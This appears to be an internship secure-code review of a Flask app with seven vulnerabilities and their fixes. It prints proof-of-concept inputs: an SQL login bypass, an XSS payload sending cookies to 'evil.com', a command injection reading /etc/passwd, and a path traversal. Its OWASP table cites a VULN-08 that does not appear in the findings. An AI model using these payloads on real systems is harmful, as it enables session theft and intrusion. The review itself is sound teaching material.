# Task 3: Secure Coding Review Report
**CodeAlpha Cybersecurity Internship**  
**Language/App:** Python / Flask Web Application  
**Reviewer:** Aswin  

---

## Executive Summary

A manual code review and static analysis of a Python Flask web application identified **7 critical security vulnerabilities** spanning SQL Injection, XSS, OS Command Injection, Path Traversal, hardcoded secrets, sensitive data exposure, and insecure debug mode. All findings include severity ratings, proof-of-concept exploits, and fixed code.

---

## Vulnerability Findings

### VULN-01 — SQL Injection (Critical)

| Field | Value |
|-------|-------|
| **Severity** | Critical (CVSS 9.8) |
| **Location** | `/login` route |
| **CWE** | CWE-89 |

**Vulnerable code:**
```python
q = f"SELECT * FROM users WHERE username='{u}' AND password='{p}'"
```

**Exploit (bypass login):**
```
username: admin'--
password: anything
```
The injected `'--` comments out the password check, granting access.

**Fix — parameterised query:**
```python
row = conn.execute(
    "SELECT password_hash FROM users WHERE username = ?", (username,)
).fetchone()
```

---

### VULN-02 — Cross-Site Scripting / XSS (High)

| Field | Value |
|-------|-------|
| **Severity** | High (CVSS 7.4) |
| **Location** | `/greet` route |
| **CWE** | CWE-79 |

**Vulnerable code:**
```python
return render_template_string(f"<h1>Hello {name}!</h1>")
```

**Exploit:**
```
/greet?name=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

**Fix:**
```python
name = escape(request.args.get("name", "stranger"))
return f"<h1>Hello {name}!</h1>"
```

---

### VULN-03 — OS Command Injection (Critical)

| Field | Value |
|-------|-------|
| **Severity** | Critical (CVSS 9.8) |
| **Location** | `/ping` route |
| **CWE** | CWE-78 |

**Vulnerable code:**
```python
out = subprocess.check_output(f"ping -c 1 {host}", shell=True, text=True)
```

**Exploit:**
```
/ping?host=localhost;cat /etc/passwd
```

**Fix — whitelist + shell=False:**
```python
if not re.fullmatch(r"[a-zA-Z0-9.\-]{1,253}", host):
    abort(400)
subprocess.run(["ping", "-c", "1", host], shell=False, ...)
```

---

### VULN-04 — Path Traversal (High)

| Field | Value |
|-------|-------|
| **Severity** | High (CVSS 7.5) |
| **Location** | `/file` route |
| **CWE** | CWE-22 |

**Vulnerable code:**
```python
with open(filename) as f: ...
```

**Exploit:**
```
/file?name=../../../etc/passwd
```

**Fix — path canonicalisation:**
```python
safe_path = os.path.realpath(os.path.join(ALLOWED_DIR, filename))
if not safe_path.startswith(ALLOWED_DIR):
    abort(403)
```

---

### VULN-05 — Hardcoded Secret Key (High)

| Field | Value |
|-------|-------|
| **Severity** | High (CVSS 7.5) |
| **Location** | Module level |
| **CWE** | CWE-798 |

**Vulnerable code:**
```python
SECRET_KEY = "admin123"
```

**Fix:**
```python
app.secret_key = os.environ.get("SECRET_KEY") or secrets.token_hex(32)
```

---

### VULN-06 — Sensitive Data Exposure (High)

| Field | Value |
|-------|-------|
| **Severity** | High (CVSS 7.5) |
| **Location** | `/debug` route |
| **CWE** | CWE-200 |

**Vulnerable code:**
```python
return str(dict(os.environ))   # leaks API keys, DB passwords, etc.
```

**Fix:** Route completely removed from production code.

---

### VULN-07 — Plaintext Password Storage (Critical)

| Field | Value |
|-------|-------|
| **Severity** | Critical (CVSS 9.1) |
| **Location** | `init_db()` |
| **CWE** | CWE-256 |

**Vulnerable code:**
```python
conn.execute("INSERT OR IGNORE INTO users VALUES (1,'admin','password123')")
```

**Fix — PBKDF2 with salt:**
```python
def hash_password(password: str) -> str:
    salt = secrets.token_hex(16)
    hashed = hashlib.pbkdf2_hmac("sha256", password.encode(), salt.encode(), 260_000)
    return f"{salt}:{hashed.hex()}"
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Manual inspection | Primary review method |
| `bandit` | Python static security analyser |
| OWASP Top 10 checklist | Vulnerability classification |

**Run bandit:**
```bash
pip install bandit
bandit -r task3_vulnerable_app.py -ll
```

---

## Recommendations Summary

| # | Fix | Priority |
|---|-----|----------|
| 1 | Use parameterised SQL queries everywhere | Critical |
| 2 | Escape all user-controlled output | High |
| 3 | Never use `shell=True` with user input | Critical |
| 4 | Validate and canonicalise file paths | High |
| 5 | Store secrets in environment variables | High |
| 6 | Remove debug/internal endpoints from production | High |
| 7 | Hash passwords with PBKDF2/bcrypt/argon2 | Critical |
| 8 | Disable `debug=True` in production Flask | Medium |

---

## OWASP Top 10 Mapping

| OWASP | Category | Vulns Found |
|-------|----------|-------------|
| A01 | Broken Access Control | VULN-04, 06 |
| A02 | Cryptographic Failures | VULN-05, 07 |
| A03 | Injection | VULN-01, 03 |
| A05 | Security Misconfiguration | VULN-06, 08 |
| A07 | Identification & Auth Failures | VULN-07 |
| A03 | XSS | VULN-02 |

---

*Reviewed as part of CodeAlpha Cybersecurity Internship — Task 3*